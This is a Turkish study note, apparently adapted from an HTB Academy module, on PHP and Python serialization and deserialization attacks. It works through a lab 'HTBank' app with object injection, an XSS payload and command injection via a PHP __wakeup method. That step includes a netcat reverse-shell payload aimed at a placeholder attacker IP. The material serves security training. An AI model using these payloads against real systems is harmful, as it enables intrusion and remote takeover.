---
{"dg-publish":true,"permalink":"/web-pentest-expert/introduction-to-deserialization-attacks/"}
---


==Serialization==, bellekte bulunan bir nesneyi alıp bir dizi bayta dönüştürme sürecidir. Bu, nesnenin saklanabilmesi veya bir ağ üzerinden iletilebilmesi ve daha sonra, belki farklı bir program veya farklı bir makine ortamında yeniden oluşturulabilmesi için yapılır.

==Deserialization== ise bunun ters işlemidir: serialized veriyi alıp bellekte orijinal nesneyi yeniden oluşturma sürecidir.

Birçok nesne yönelimli programlama dili, serialization işlemini doğal olarak destekler. Bunlar arasında şunlar bulunmaktadır ancak bunlarla sınırlı değildir:

* Java 
* Ruby 
* Python 
* PHP 
* C#

Bu modül süresince sadece Python ve PHP'ye odaklanacağız; ancak, öğretilen aynı kavramların serializasyonu destekleyen tüm dillere olmasa da çoğuna tekrar uygulanabileceğini lütfen unutmayın.


### PHP Serialization

Örnek olarak, PHP'de bir diziyi bu şekilde serialize eder:

![Pasted image 20241211142745.png](/img/user/resimler/Pasted%20image%2020241211142745.png)
![Pasted image 20241211142754.png](/img/user/resimler/Pasted%20image%2020241211142754.png)

**Serialization**: `$original_data` adında bir dizi tanımlandı ve bu dizi, `serialize()` fonksiyonu ile baytlara dönüştürüldü. Sonuç, dizinin yapılandırmasını ve içeriğini serileştirilmiş bir string olarak saklar.

Örnek çıktı:

`a:3:{i:0;s:3:"HTB";i:1;i:123;i:2;d:7.77;}`

Bu, serileştirilmiş veriyi temsil eder:

- `a:3`: 3 elemanlı bir dizi (array).
- `i:0`: İlk eleman bir indeks (0).
- `s:3:"HTB"`: İlk eleman 3 karakter uzunluğunda bir string ("HTB").
- `i:1;i:123`: İkinci eleman bir integer (123).
- `i:2;d:7.77`: Üçüncü eleman bir float (7.77).

**Deserialization**: `unserialize()` fonksiyonu ile serileştirilmiş string yeniden bir diziye dönüştürüldü.

**Output**: `var_dump()` ile yeniden oluşturulan dizinin detaylı yapısı görüntülendi:

![Pasted image 20241211142903.png](/img/user/resimler/Pasted%20image%2020241211142903.png)

Bu süreç, veriyi serialize ederek güvenli bir şekilde saklama veya iletme ve ardından gerektiğinde bu veriyi yeniden orijinal formatına dönüştürme işlemini gösterir.


Gördüğünüz gibi, `$original_data` bir string ( `"HTB"` ), bir integer ( `123` ) ve bir double ( `7.77` ) içeren bir array'dir. `serialize` fonksiyonu kullanılarak, bu array, array'i temsil eden baytlara dönüştürülür. Daha sonra bu serileştirilmiş string'i `unserialize` fonksiyonu ile eski haline getirip orijinal array'i yeniden oluşturuyoruz. Bu durum, `$reconstructed_data` değişkenine yapılan `var_dump` çıktısıyla doğrulanabilir.

PHP'deki serialized nesneler, diğer birçok dildeki serialized nesnelere kıyasla okunması kolaydır. Diğer dillerdeki serialized nesneler genellikle insan gözüyle tamamen anlamsız görülebilir. Bunu Python örneğinde daha net göreceğiz. Ancak bundan önce, serileştirilmiş verideki harf ve sayıların ne anlama geldiğini anlayalım:

`a:3:{ // (A)rray, (3) öğeden oluşuyor`
 `i:0;s:3:"HTB"; // (I)ndex (0); (S)tring, uzunluğu (3) ve değeri: "HTB"`
 `i:1;i:123; // (I)ndex (1); (I)nteger, değeri (123)`
 `i:2;d:7.77; // (I)ndex (2); (D)ouble, değeri (7.77)`
`}`


- **`a:3`**: (Array), 3 öğeden oluşan bir dizi.
- **`i:0`**: (Index) 0. öğe.
- **`s:3:"HTB"`**: (String), uzunluğu 3 olan bir string, değeri "HTB".
- **`i:1`**: (Index) 1. öğe.
- **`i:123`**: (Integer), değeri 123 olan bir tamsayı.
- **`i:2`**: (Index) 2. öğe.
- **`d:7.77`**: (Double), değeri 7.77 olan bir ondalıklı sayı.


### Python Serialization

Yukarıdaki PHP örneğine benzer şekilde, Python'da bir array serialize edeceğiz. Python için PyYAML ve JSONpickle gibi serializasyon uygulayan birden fazla kütüphane vardır. Ancak, [Pickle](https://docs.python.org/3/library/pickle.html) local uygulamadır ve bu örnekte kullanılacak olan da budur.

![Pasted image 20241211143221.png](/img/user/resimler/Pasted%20image%2020241211143221.png)
![Pasted image 20241211143226.png](/img/user/resimler/Pasted%20image%2020241211143226.png)

Serialized veri için `pickle` çıktısını okumak, PHP'nin sağladığı çıktıyı okumaktan çok daha zordur. Ancak yine de mümkündür. `pickle` kütüphanesindeki [yorumlara](https://github.com/python/cpython/blob/main/Lib/pickletools.py#L38) göre, bir pickle, sanal bir pickle makinesi (PM) için bir programdır. Bu PM, bir stack ve bir memo (uzun süreli bellek) içerir. Pickled bir nesne ise, PM'nin çalıştırması için bir dizi opcode'dan (işlem kodu) oluşur ve bu opcode'lar, stack üzerinde rastgele bir nesneyi yeniden oluşturur.

PM'nin stack'i bir Last-In-First-Out (LIFO) veri yapısıdır. Nesneleri stack'in en üstüne itebilir ve en üstteki nesneyi stack'ten çıkarabilirsiniz.

`pickle` kütüphanesindeki yorumlardan alıntı yapacak olursak, PM'nin memo'su, "pickler'ın daha önce gördüğü nesneleri hatırlayan bir veri yapısıdır, böylece paylaşılan veya recursive nesneler değer olarak değil, referans olarak pickled edilir."

[Lib/pickle.py](https://github.com/python/cpython/blob/3.10/Lib/pickle.py#L111) (Python 3.10) içinde, tanımlanmış tüm pickle opcode'larını görebiliriz ve bunlara ve çeşitli pickling fonksiyonlarının kaynak koduna başvurarak, serialized_data'mızın pickle.loads()'a aktarıldığında tam olarak ne yaptığını bir araya getirebiliriz:

Bu, Python'un **pickle** modülünün bir serileştirilmiş verisini (byte formatında) ve bu verinin nasıl çözülüp yapılandırıldığını açıklayan bir açıklamadır. Pickle, Python objelerini (örneğin listeler, diziler, nesneler) ikili formatta serileştirip, verileri saklamak veya başka bir sistemde tekrar kullanmak amacıyla kullanılır. Yukarıdaki açıklamada, bir **pickle byte stream**'inin iç yapısı ve her bir byte dizisinin ne anlama geldiği açıklanmış.

Bu açıklamayı adım adım incelersek:

1. **'\x80\x04'**:  
    Bu, pickle formatının sürümünü belirtir. Burada, pickle protokol sürümü 4 kullanıldığı belirtiliyor. Protokol sürümü, Python 3.8 ve sonrasında varsayılan olarak 4'tür.
    
2. **'\x95\x16\x00\x00\x00\x00\x00\x00\x00'**:  
    Bu, serileştirilen verinin uzunluğunu belirten bir header'dır. 16 bayt uzunluğunda olduğunu gösterir.
    
3. **'\x94' (EMPTY_LIST)**:  
    Bu, boş bir listeyi stack'e (yığın) ekler. Daha sonra listeye öğeler eklemek için kullanılacaktır.
    
4. **'(' (MARK)**:  
    Bu işaretçi, bir nesnenin başlangıç noktasını belirtir ve "markobject" olarak adlandırılır. Bu noktadan sonra gelen öğeler, daha önce tanımlanan nesneyle ilişkilendirilir.
    
5. **'\x8c\x03HTB' (SHORT_BINUNICODE 3 HTB)**:  
    Bu, 'HTB' adında 3 karakter uzunluğunda bir unicode string (metin) öğesini ekler.
    
6. **'\x94' (MEMOIZE)**:  
    Bu, yukarıda eklenen string (yani 'HTB')'yi memoya (yani serileştirilen nesnelerin geçici hafızasında tutulduğu yer) kaydeder.
    
7. **'K{' (BININT1)**:  
    Bu, 123 sayısını temsil eden bir 1-byte unsigned integer'ı ekler.
    
8. **'G@\x1f\x14z\xe1G\xae\x14' (BINFLOAT)**:  
    Bu, 7.77'yi temsil eden bir float değeri ekler. Python, bu değeri IEEE 754 double precision formatında temsil eder.
    
9. **'e' (APPENDS)**:  
    Bu komut, stack'teki listeyi yukarıda tanımlanan öğelerle genişletir. Yani 'HTB', 123, ve 7.77 öğeleri listeye eklenir.
    
10. **'.' (STOP)**:  
    Bu, pickle işleminin sonlandığını ve serileştirilen verinin tamamlandığını belirtir. Bu noktada, oluşturulan liste `['HTB', 123, 7.77]` stack'te yer alır.
    

Özetle, bu pickle verisi, Python'da `['HTB', 123, 7.77]` adlı bir listeyi serileştirmek için kullanılmış ve her bir byte dizisinin ne anlama geldiği adım adım açıklanmış.



### Introduction to Deserialization Attacks

Önceki bölümde belirtildiği gibi, deserialization serialization'ın tersi bir eylemdir, özellikle serialize edilmiş verileri alır ve bellekteki orijinal nesneyi yeniden yapılandırır.

Eğer bir uygulama kullanıcı kontrolündeki verileri deserialize ederse, o zaman bir deserializasyon saldırısının gerçekleşme olasılığı vardır. Saldırı, uygulama tarafından üretilen serialleştirilmiş veriyi alıp bizim yararımıza değiştirmeyi veya belki de kendi serialize edilmiş verimizi üretip sağlamayı içerir.


### Tarihçe  

Deserialization (tersine serileştirme) bir saldırı vektörü olarak 2011 yılından beri biliniyor, ancak 2016 yılında Java Deserialization Kıyameti ile viral hale geldi. Bu, 2015 yılında gerçekleştirilen bir konuşmanın sonucuydu. Güvenlik araştırmacıları @frohoff ve @gebl, deserialization saldırılarını ayrıntılı bir şekilde açıkladılar ve Java deserialization payload'larını oluşturmak için kullanılan ünlü araç olan ysoserial'i yayımladılar.  

Günümüzde, güvensiz deserialization özellikleri, OWASP Top 10'da A08:2021 - Yazılım ve Veri Bütünlüğü Hataları kategorisinde yer alıyor ve her yıl bu konuya ilişkin birçok CVE (Common Vulnerabilities and Exposures) yayımlanıyor.



### Attacks

Bu modül boyunca, iki temel deserialization saldırısını ele alacağız :

* Object Injection 
* Remote Code Execution

Object Injection, serialized verilerin değiştirilmesi anlamına gelir, böylece sunucu deserialization sırasında istenmeyen bilgileri alır. Örneğin, bir kullanıcının web sitesindeki rolünü içeren serialize edilmiş bir nesne düşünün. Bu nesnenin kontrolü elimizde olsaydı, sunucu nesneyi deserialize ettiğinde bunun yerine yönetici rolüne sahip olduğumuzu söyleyecek şekilde değiştirebilirdik.

Remote Code Execution kendi kendini açıklar: bu saldırıda, sunucu tarafında deserialized edildikten sonra komut yürütülmesine neden olan serialized bir payload sağlarız.


### Serialization Tanımlanması


### White Box

Kaynak koda erişimimiz olduğunda, belirli fonksiyon çağrılarını aramak isteriz olası deserialization güvenlik açıklarını hızlı bir şekilde belirler. Bu fonksiyonlar şunları içerir (ancak kesinlikle bunlarla sınırlı değildir):

* unserialize() - PHP
* pickle.loads() - Python Pickle
* jsonpickle.decode() - Python JSONPickle
* yaml.load() - Python PyYAML / ruamel.yaml
* readObject() - Java
* Deserialize() - C# / .NET
* Marshal.load() - Ruby


### Black-Box

Kaynak koda erişimimiz yoksa, serialized verilerdeki farklı özellikler nedeniyle serialized verileri tanımlamak yine de kolaydır:

1. Eğer şöyle görünüyorsa:  
    a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1:{i:0;i:4;}i:3;s:7:"ACADEMY";} - PHP
    
2. Eğer şöyle görünüyorsa:  
    (lp0\nS'Test'\np1\naS'Data'\np2\na(lp3\nI4\naaS'ACADEMY'\np4\na. - Pickle
    
    - Protokol 0, Python 2.x için varsayılan
3. Bytes başlangıcı 80 01 (Hex) ve sonu ile. - Pickle Protokol 1, Python 2.x
    
4. Bytes başlangıcı 80 02 (Hex) ve sonu ile. - Pickle Protokol 2, Python 2.3+
    
5. Bytes başlangıcı 80 03 (Hex) ve sonu ile. - Pickle Protokol 3, Python 3.0-3.7 için varsayılan
    
6. Bytes başlangıcı 80 04 95 (Hex) ve sonu ile. - Pickle Protokol 4, Python 3.8+ için varsayılan
    
7. Bytes başlangıcı 80 05 95 (Hex) ve sonu ile. - Pickle Protokol 5, Python 3.x
    
8. ["Test", "Data", [4], "ACADEMY"] - JSONPickle, Python 2.7 / 3.6+
    
9. - Test\n
    - Data\n
    - - 4\n
    - ACADEMY\n - PyYAML / ruamel.yaml, Python 3.6+
10. Bytes başlangıcı AC ED 00 05 73 72 (Hex) veya rO0ABXNy (Base64) - Java
    
11. Bytes başlangıcı 00 01 00 00 00 ff ff ff ff (Hex) veya AAEAAAD///// (Base64) - C# / .NET
    
12. Bytes başlangıcı 04 08 (Hex) - Ruby


Serialized verileri otomatik olarak tespit etmek için bazı araçlar geliştirilmiştir. Örneğin [Freddy](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3), BurpSuite için Java/.NET serialization'ın algılanmasına ve kullanılmasına yardımcı olan bir uzantıdır.

Deserialization ve serialization çıkarma saldırılarını yüksek düzeyde ele aldığımıza göre, şimdi hem PHP hem de Python deserialization açıklarından yararlanmaya derinlemesine dalalım.


### Identifying a Vulnerability (PHP)


### Scenario (HTBank)

HTBank GmbH'nin bizden yeni geliştirdikleri web sitesi için bir white-box değerlendirmesi yapmamızı istediğini düşünelim. Bize bir URL, web sitesinin kaynak kodu ve @htbank.com e-posta adresleriyle hesap oluşturmanın imkansız olduğu, çünkü yöneticilerin bunları kullandığı ipucunu verdiler.


### Siteyi Keşfetmek

Web sitesine girdiğimizde, bize hiçbir kimlik bilgisi verilmeyen bir giriş ekranı ile karşılaştık.

![Pasted image 20241211150302.png](/img/user/resimler/Pasted%20image%2020241211150302.png)

Yeni bir hesap kaydetmek için bir seçenek olduğunu fark ettik. Bir kullanıcıyı @htbank.com e-posta adresiyle kaydetmeye çalışmanın E-posta biçimi geçersiz hata mesajıyla sonuçlandığını doğrulayabiliriz, bu nedenle [email protected]:pentest kimlik bilgileriyle bir test hesabı kaydedeceğiz ve ardından oturum açacağız.

![Pasted image 20241211150335.png](/img/user/resimler/Pasted%20image%2020241211150335.png)

Not: pentest'e parola olarak izin verilmesi, bir parola politikasının olmadığını gösterir, ancak bu modülün kapsamı dışındadır.

Giriş yaptıktan sonra, placeholder text iel doldurulmuş gibi görünen ana sayfaya yönlendiriliyoruz. Belki de hala geliştirme aşamasındadır. Bununla birlikte, navbar'da /settings'e giden bir bağlantı görebiliyoruz, buna bir göz atmalıyız.

![Pasted image 20241211150458.png](/img/user/resimler/Pasted%20image%2020241211150458.png)

Settings (Ayarlar) sayfasında, kullanıcı adımızı, e-postamızı, şifremizi ve profil resmimizi güncelleyebileceğimizi, ayrıca bazı ayarları import ve export edebileceğimizi görüyoruz. İlk olarak, e-postamızı @htbank.com olarak güncellemeyi deneyebiliriz, ancak bu yine başarısız olur. Şimdilik profil resmi yüklemeyi görmezden geleceğiz ve Ayarları Import/Export Aktar özelliğine odaklanacağız.

![Pasted image 20241211150647.png](/img/user/resimler/Pasted%20image%2020241211150647.png)

Export Settings'e tıkladığımızda Base64 ile kodlanmış gibi görünen uzun bir string görürüz.

![Pasted image 20241211150712.png](/img/user/resimler/Pasted%20image%2020241211150712.png)

Bu stringin ne olduğu belli olmadığından, local olarak kodunu çözeceğiz ve serialized bir PHP nesnesi olduğunu bulacağız.

![Pasted image 20241211150739.png](/img/user/resimler/Pasted%20image%2020241211150739.png)

Bu bir white-box testi olduğundan, bu fonksiyonun tam olarak ne yaptığını görmek için kaynak kodunu kontrol etmeliyiz. Dosya yapısına bakarak bunun bir [[Bağlantılar/Laravel\|Laravel]] uygulaması olduğunu anlayabiliriz. Her dosyayı tek tek inceleme zahmetinden kurtulmak için, ayarlarımızı export ettikten sonra aldığımız mesajı grep ile arayabiliriz.

![Pasted image 20241211180112.png](/img/user/resimler/Pasted%20image%2020241211180112.png)

**grep**: Belirli bir metni dosyalarda aramak için kullanılır.

**'Exported user settings!'**: Bu metni arar.

**-n**: Satır numaralarını gösterir.

**-r**: Alt dizinlerdeki dosyaları da tarar.

**.** : Mevcut dizinden aramaya başlar.


Belirtilen konumda, yani `app/Http/Controllers/HTController.php` dosyasında, kullanıcı bilgilerini içe ve dışa aktarma işlemlerini yöneten aşağıdaki kodu görüyoruz.

![Pasted image 20241211180315.png](/img/user/resimler/Pasted%20image%2020241211180315.png)
![Pasted image 20241211180334.png](/img/user/resimler/Pasted%20image%2020241211180334.png)

**Serialize** ve **unserialize** kullanımı, Base64 string'inin **serialized** bir PHP nesnesi olduğunu doğruluyor. Bu durumda, sunucu **serialized** bir **UserSettings** nesnesini (app/Helpers/UserSettings.php dosyasında tanımlıdır) kabul ediyor ve ardından **unserialized** nesnenin değerlerine göre giriş yapan kullanıcının bilgilerini güncelliyor.

**Unserialize** edilmeden önce dize üzerinde herhangi bir filtreleme veya kontrol yapılmadığı için, bu, sömürebileceğimiz bir zayıflık gibi görünüyor.

Not: Ayarların veya ilerlemenin **import** ve **export** edilmesi, özellikle oyunlarda oldukça yaygındır, bu nedenle bu özelliklere her zaman dikkat edin, çünkü düzgün bir şekilde güvence altına alınmamışlarsa zayıf olabilirler.


### Object Injection (PHP)


#### E-posta Adresimizin Güncellenmesi

Önceki bölümde handleSettingsIE() içinde çok ilginç görünen serialize ve unserialize çağrıları tanımladık. app/Helpers/UserSettings.php dosyasına baktığımızda Name , Email , Password ve ProfilePic'in bu objede saklanan detaylar olduğunu görebiliriz.


`<?php`
`namespace App\Helpers;`

`class UserSettings {`
    `private $Name;`
    `private $Email;`
    `private $Password;`
    `private $ProfilePic;`

    `public function getName() {`
        `return $this->Name;`
    `}`

    `public function getEmail() {`
        `return $this->Email;`
    `}`

    `public function getPassword() {`
        `return $this->Password;`
    `}`

    `public function getProfilePic() {`
        `return $this->ProfilePic;`
    `}`

    `public function setName($Name) {`
        `$this->Name = $Name;`
    `}`

    `public function setEmail($Email) {`
        `$this->Email = $Email;`
    `}`

    `public function setPassword($Password) {`
        `$this->Password = $Password;`
    `}`

    `public function setProfilePic($ProfilePic) {`
        `$this->ProfilePic = $ProfilePic;`
    `}`

    `public function __construct($Name, $Email, $Password, $ProfilePic) {`
        `$this->setName($Name);`
        `$this->setEmail($Email);`
        `$this->setPassword($Password);`
        `$this->setProfilePic($ProfilePic);`
    `}`

    `// ... (diğer metotlar burada olabilir)`
`}`


Bu PHP sınıfı, **UserSettings** adında bir kullanıcı ayarları yönetimi sınıfıdır. Kullanıcı adı, e-posta, şifre ve profil resmi gibi bilgileri saklamak için dört özel (private) değişkeni vardır.

- **get** metodları: Bu değişkenlere erişmek için kullanılır.
- **set** metodları: Değişkenlere değer atamak için kullanılır.
- **__construct** metodu: Sınıfın bir örneği oluşturulduğunda, kullanıcı bilgilerini başlatmak için çağrılır ve ilgili **set** metodları ile değerler atanır.

Bu sınıf, kullanıcı ayarlarını düzenlemek ve yönetmek için temel bir yapı sağlar.


Bu bilgiyle, rastgele ayrıntılarla serialized UserSettings nesneleri üretebilmeliyiz ve HTBank GmbH bize @htbank.com e-posta adresleriyle kullanıcı hesapları oluşturamayacağınızı özellikle söylediğinden, yapmaya çalışacağımız ilk şey bu olacak.

İlk olarak, UserSettings.php adında bir dosya oluşturacağız ve app/Helpers/UserSettings.php içeriğini buraya kopyalayacağız. Ardından, [email protected] e-posta adresi ve pentest şifresi ile serialize edilmiş bir UserSettings nesnesi oluşturmak için aynı dizinde aşağıdaki içeriğe sahip exploit.php adlı başka bir dosya oluşturacağız.

![Pasted image 20241211182142.png](/img/user/resimler/Pasted%20image%2020241211182142.png)

Bu PHP dosyasını local olarak çalıştırabilir ve serialize edilmiş nesnemizi elde edebiliriz:

![Pasted image 20241211182208.png](/img/user/resimler/Pasted%20image%2020241211182208.png)


### Testing Locally

Gerçek hedefe karşı herhangi bir saldırı gerçekleştirmeden önce, kaynak kodu elimizde olduğundan, her şeyin beklendiği gibi çalışıp çalışmadığını iki kez kontrol etmek için önce saldırıyı lokal olarak test etmek iyi bir fikirdir.

Birçok bağımlılığı yüklemek ve bir MySQL sunucusu kurmak zorunda kalmamak için, test etmemiz gereken hedeflenen fonksiyonu izole edeceğiz. Bu durumda hedef fonksiyonumuz app/Http/Controllers/HTController.php:handleSettingsIE() olup burada unserialize çağrılmaktadır.

Local olarak target.php adında bir dosya oluşturabilir ve handleSettingsIE() fonksiyonunun (biraz değiştirilmiş) içeriğini buraya koyabiliriz, özellikle :

![Pasted image 20241211182334.png](/img/user/resimler/Pasted%20image%2020241211182334.png)

Artık istismarı canlı hedefe karşı çalıştırmadan önce lokal olarak test edebilmeliyiz. Ürettiğimiz base64 kodlu payload'u target.php'ye argüman olarak ileterek, uygulamanın unserializing işleminden sonra çalışacağı değerleri görebiliriz:

![Pasted image 20241211182412.png](/img/user/resimler/Pasted%20image%2020241211182412.png)
![Pasted image 20241211182417.png](/img/user/resimler/Pasted%20image%2020241211182417.png)

Her şey iyi görünüyor, bu yüzden saldırıyı canlı hedefe karşı yeniden çalıştırmaya devam edebiliriz.


### Running against the Target

Base64 stringini Settings'e yapıştırıp Import Settings'e tıkladığımızda ayarların import edildiğine dair bir onay mesajı alıyoruz ve Update Settings bölümüne baktığımızda e-postamızın [email protected] olarak güncellendiğini teyit edebiliyoruz. Bu noktada, farklı bir şey olup olmadığını diğer sayfalardan kontrol edebiliriz.

![Pasted image 20241211182559.png](/img/user/resimler/Pasted%20image%2020241211182559.png)


### Reflected XSS

Yukarıdaki ekran görüntüsünde, bir kullanıcıyı başarıyla import ettikten sonra kullanıcı adımızın mesajda görüntülendiğini görebiliriz. Yine grep kullanarak, bu mesajın app/Http/Controllers/HTController.php içinde oluşturulduğunu ve ie-message değişkenine atandığını görebiliriz:

![Pasted image 20241211182636.png](/img/user/resimler/Pasted%20image%2020241211182636.png)

ie-message değişken adını aradığımızda birkaç yanıt görüyoruz, ancak bir tanesi göze çarpıyor:

![Pasted image 20241211182655.png](/img/user/resimler/Pasted%20image%2020241211182655.png)
![Pasted image 20241211182658.png](/img/user/resimler/Pasted%20image%2020241211182658.png)

Laravel, sayfalarını render etmek için Blade şablon motorunu kullanır ve genellikle şablonlarda değişkenleri görüntülerken onları {{ ... }} içine alırız. Dokümantasyona bakarak, bir değişkeni {!! ... !!} içine almanın, görüntülenmeden önce **htmlspecialchars** fonksiyonundan geçirilmemesi anlamına geldiğini görebiliriz.

Kullanıcı tarafından kontrol edilen ve kaçırılmadan (escaped) tekrar bize gösterilen veriler, XSS (Cross-Site Scripting) saldırısı için mükemmel bir senaryodur. Bu nedenle, exploit.php dosyamızı güncelleyerek bu zayıflığı doğrulamak için Name alanını `<script>alert(1)</script>` olarak ayarlayabiliriz.

![Pasted image 20241211183238.png](/img/user/resimler/Pasted%20image%2020241211183238.png)

exploit.php dosyasını tekrar çalıştırdığımızda, Base64 ile kodlanmış başka bir payload elde ederiz:

![Pasted image 20241211183259.png](/img/user/resimler/Pasted%20image%2020241211183259.png)

Lokal testler payload'un beklendiği gibi çalıştığını doğrulamaktadır:

![Pasted image 20241211183325.png](/img/user/resimler/Pasted%20image%2020241211183325.png)

Bu payload'u alabilir ve sisteme aktardığımızda, başarılı bir reflected XSS saldırısını gösteren bir açılır pencere almalıyız.

![Pasted image 20241211183401.png](/img/user/resimler/Pasted%20image%2020241211183401.png)


### RCE: Magic Methods

Bir önceki bölümde kendimize @htbank.com e-posta adresi verebileceğimizi tespit ettik ve bir XSS açığı bulduk. Son adım olarak sunucu üzerinde remote code execution elde etmeye çalışacağız.

app/Helpers/UserSettings.php dosyasına tekrar baktığımızda, dosyanın alt kısmında __construct , __wakeup() ve __sleep() fonksiyonlarının tanımlarını görebiliriz:

![Pasted image 20241211183509.png](/img/user/resimler/Pasted%20image%2020241211183509.png)

PHP'de, adları __ ile başlayan fonksiyonlar dil tarafından rezerve edilmiştir. Bu fonksiyonlardan bir alt kümesi, **magic methods** olarak adlandırılan ve **__sleep**, **__wakeup**, **__construct** ve **__destruct** gibi fonksiyonları içeren özel metodlardır. Bu metodlar, bir nesne üzerinde çağrıldığında varsayılan PHP işlemlerini geçersiz kılar.

PHP'nin toplam 17 magic yöntemi vardır. Açık kaynak projelerinde kullanımlarına göre sıralandıklarında, bunlar aşağıdaki gibidir:

İşte PHP'deki **magic methods** (sihirli metodlar) ve açıklamaları:

- **__construct**: Bir sınıf için bir yapıcı (constructor) tanımlar. Yeni bir örnek oluşturulduğunda çağrılır. Örn: `new Class()`.
- **__toString**: Bir nesne bir string olarak işlenmeye çalışıldığında nasıl davranacağını tanımlar. Örn: `echo $obj`.
- **__call**: Bir nesne bağlamında erişilemeyen metotlara erişilmeye çalışıldığında çağrılır. Örn: `$obj->doesntExist()`.
- **__get**: Erişilemeyen özelliklere okuma yapıldığında çağrılır. Örn: `$obj->doesntExist`.
- **__set**: Erişilemeyen özelliklere yazma yapıldığında çağrılır. Örn: `$obj->doesntExist = 1`.
- **__clone**: Bir nesne klonlanmak istendiğinde çağrılır. Örn: `$copy = clone $object`.
- **__destruct**: Bir nesne yok edildiğinde çağrılır (yapıcı metodun zıttı).
- **__isset**: Erişilemeyen özellikler üzerinde `isset()` veya `empty()` çağrıldığında çağrılır. Örn: `isset($obj->doesntExist)`.
- **__invoke**: Bir nesne fonksiyon gibi çağrıldığında çağrılır. Örn: `$obj()`.
- **__sleep**: Bir nesne serileştirilirken çağrılır. **__serialize** ve **__sleep** tanımlanmışsa, **__sleep** yoksayılır. Örn: `serialize($obj)`.
- **__wakeup**: Bir nesne serileştirilmiş halinden geri yüklenirken çağrılır. **__unserialize** ve **__wakeup** tanımlanmışsa, **__wakeup** yoksayılır. Örn: `unserialize($ser_obj)`.
- **__unset**: Erişilemeyen özellikler üzerinde `unset()` çağrıldığında çağrılır. Örn: `unset($obj->doesntExist)`.
- **__callStatic**: Statik bir bağlamda erişilemeyen metotlara erişilmeye çalışıldığında çağrılır. Örn: `Class::doesntExist()`.
- **__set_state**: Bir nesne üzerinde `var_export` çağrıldığında çağrılır. Örn: `var_export($obj, true)`.
- **__debuginfo**: Bir nesne üzerinde `var_dump` çağrıldığında çağrılır. Örn: `var_dump($obj)`.
- **__unserialize**: Bir nesne serileştirilmiş halinden geri yüklenirken çağrılır. **__unserialize** ve **__wakeup** tanımlanmışsa, **__unserialize** kullanılır. Sadece PHP 7.4+ sürümlerinde. Örn: `unserialize($obj)`.
- **__serialize**: Bir nesne serileştirilirken çağrılır. **__serialize** ve **__sleep** tanımlanmışsa, **__serialize** kullanılır. Sadece PHP 7.4+ sürümlerinde. Örn: `unserialize($obj)`.


Örneğimizde, **__construct** varsayılan PHP **constructor**'ını geçersiz kılarak, yeni bir **UserSettings** nesnesi oluşturulduğunda ne olacağını belirlememize olanak tanır (bu durumda, **constructor**'ın parametrelerinden değerler atama işlemi yapılır). **UserSettings** nesnesi için **__sleep** tanımlamak, nesne **serialized** olduğunda bu fonksiyonun önceden çalıştırılacağı anlamına gelir. Benzer şekilde, **__wakeup** nesne **unserialized** edilmeden hemen önce çağrılır.

Bu metodların ne işe yaradığını bildiğimizde, **__wakeup** metodunun dikkatimizi çektiğini görebiliriz. Fonksiyonun, her kullanıcı **unserialized** edildiğinde **/tmp/htbank.log** dosyasına bir satır eklediğini görüyoruz, bu da her kullanıcı ayarları siteye import edildiğinde gerçekleşmelidir. Özellikle dikkat çeken nokta ise, **shell_exec** fonksiyonunun bizim kontrol edebileceğimiz bir değişkenle kullanılması ( **$this->getName()** Name özelliğini döndürüyor, bu özelliği biz ayarlayabiliyoruz).

**shell_exec** fonksiyonuna geçirilen komutun bir kısmını kontrol edebildiğimizi ve herhangi bir filtreleme yapılmadığını gördüğümüzde, bu basit bir **command injection** örneğidir. Adımızı "; ile başlatırsak, **echo** komutundan çıkabiliriz ve istediğimiz başka bir komutu çalıştırabiliriz.


### Reverse Shell Alma

Bir komut enjeksiyonunun mümkün olması gerektiğini bilerek, exploit.php'yi ismimizi ”; nc -nv <ATTACKER_IP> 9999 -e /bin/bash; # olarak ayarlayacak şekilde güncelleyebiliriz.

![Pasted image 20241211184049.png](/img/user/resimler/Pasted%20image%2020241211184049.png)

Yeni payload'umuzu almak için exploit.php'yi tekrar çalıştıracağız:

![Pasted image 20241211184127.png](/img/user/resimler/Pasted%20image%2020241211184127.png)

Her şeyin yolunda olup olmadığını kontrol etmek için local UserSettings.php dosyamızı shell_exec'e aktarılacak komutun tamamını yazdıracak şekilde güncelleyebiliriz.

![Pasted image 20241211184215.png](/img/user/resimler/Pasted%20image%2020241211184215.png)
![Pasted image 20241211184219.png](/img/user/resimler/Pasted%20image%2020241211184219.png)



### Testing Locally

İlk olarak, yerel bir Netcat dinleyicisi başlatmalı ve payload'u lokal olarak test etmeliyiz.

![Pasted image 20241211184247.png](/img/user/resimler/Pasted%20image%2020241211184247.png)

Komut enjeksiyonunun başarılı olduğunu görebiliyoruz ve target.php'yi çalıştırdığımız diğer zamanlarda olduğu gibi hiçbir değerin yazdırılmadığını fark edebilirsiniz (Netcat'i kapatana kadar).


### Running against the Target

Saldıran makinemizdeki listener'ı yeniden başlatabiliriz ve payload'u web uygulamasına aktardığımızda bir reverse shell elde etmeliyiz:

![Pasted image 20241211184402.png](/img/user/resimler/Pasted%20image%2020241211184402.png)


### Other Attacks

HTBank örneğinde, shell_exec'e girdiyi kontrol etmek ve böylece çalıştırılan komutu kontrol etmek için deserialization kullandık. Ancak, deserialization komut enjeksiyonuna özel değildir ve geliştiricilerin hangi magic fonksiyonları tanımladığına bağlı olarak her zaman uzaktan kod çalıştırma ile sonuçlanmayacaktır. Bir saldırgan olarak yaratıcı olmanız gerekir ve deserialization yoluyla SQLi, LFI ve DoS gibi saldırılar gerçekleştirmenin mümkün olduğunu görebilirsiniz.



### Deserialization yoluyla SQLi

İşte **deserialization** yoluyla olası bir SQL enjeksiyonuna dair bir örnek. Farz edelim ki, **UserModel** ve **UserProperty** sınıfları hedeflenen bir web sitesinin kaynak kodundan kopyalanmış ve **POST_Check_User_Property**, web sitesinin bazı örnek POST isteklerini nasıl işlediğini yeniden yaratacak şekilde, bir **UserProperty** nesnesinin **deserialized** edilmesine yol açan bir işlem.

Burada tanımlanmış pek çok magic metot vardır, ancak birkaç tanesi dikkat çekmelidir. `UserModel.__get()` içinde MySQL veritabanının $get sütunu için sorgulandığını görebiliriz (örneğin $userModel->email, SELECT email FROM ... şeklinde sonuçlanacaktır).

`UserProperty.__wakeup()` fonksiyonunda, bir UserProperty nesnesinin deserialize edilmesinin ardından yeni bir UserModel nesnesinin oluşturulduğunu ve muhtemelen güncellenip güncellenmediğini kontrol etmek için özellik için sorgulandığını görebiliriz.

